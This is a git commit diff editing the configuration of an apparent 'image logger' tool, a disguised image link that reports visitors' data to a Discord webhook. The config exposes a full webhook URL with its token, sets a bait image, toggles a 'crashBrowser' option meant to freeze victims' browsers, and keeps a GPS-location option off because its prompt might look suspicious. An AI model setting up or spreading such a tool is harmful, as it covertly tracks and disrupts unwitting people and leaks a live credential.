78bca7567db544931c2f6728e98ab5abcecad3e9
ZABLURKIZEMONE <mist.fans24@gmail.com>
2026-09-07 09:42:51 +0400

    Update main.py

--- api/main.py
+++ api/main.py
@@ -15,7 +15,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1513543166073245927/_j3_jlugLQwiqPiaoEqo0Kmg89V3w34-We01UrZkawKZrDQ_PRDKOEzAsMtlXG2PwxS9",
-    "image": "https://www.google.com/url?sa=t&source=web&rct=j&url=https%3A%2F%2Ftenor.com%2Fview%2Fyou-are-hacked-gif-4412007773878397887&ved=0CBYQjRxqFwoTCOC-l7zU25YDFQAAAAAdAAAAABA4&opi=89978449", # You can also have a custom image by using a URL argument
+    "image": "https://tse2.mm.bing.net/th/id/OIP.kxeMpX_UCkmIeiemdlvwsgHaFX?r=0&rs=1&pid=ImgDetMain&o=7&rm=3", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
